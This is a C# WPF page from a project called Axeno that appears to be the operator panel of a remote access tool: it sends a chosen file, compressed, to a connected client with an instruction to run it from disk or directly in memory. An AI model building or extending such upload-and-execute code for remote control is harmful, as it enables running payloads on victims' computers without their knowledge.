using Axeno.Algorithm;
using Axeno.MessagePack;
using Axeno.Networking.Connection;
using MahApps.Metro.Controls.Dialogs;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Axeno.Views.Pages.ClientManager
{
    /// <summary>
    /// Interaction logic for Dl_Execute.xaml
    /// </summary>
    public partial class Dl_Execute : Page
    {
        public static Client Socket { get; set; }
        public Dl_Execute(Client cli)
        {
            InitializeComponent();
            cli.sendFile = this;
            Socket = cli;
        }

        private void tbfilepath_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            OpenFileDialog f = new OpenFileDialog();
            f.AddExtension = false;
            f.Title = "Select File - Axeno";
            if((bool)f.ShowDialog())
            {
                if(f.FileName != null)
                {
                    tbfilepath.Text = f.FileName;
                }
            }
        }

        private async void btnExec_Click(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrEmpty(tbfilepath.Text)) return;
            string runtype;
            if (execdisk.IsChecked == true) runtype = "Disk";
            else runtype = "Memory";
            btnexec.IsEnabled = false;
            btnexec.Content = "Sending...";
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "SendFile";
            string fpath = tbfilepath.Text;
            await Task.Run(() =>
            {
                msgpack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(fpath)));
                msgpack.ForcePathObject("Extension").AsString = System.IO.Path.GetExtension(fpath);
                msgpack.ForcePathObject("RunType").AsString = runtype;

                Socket.QueueCommand(msgpack.Encode2Bytes());

            });


            btnexec.Content = "Awaiting execution...";
        }

    }
}
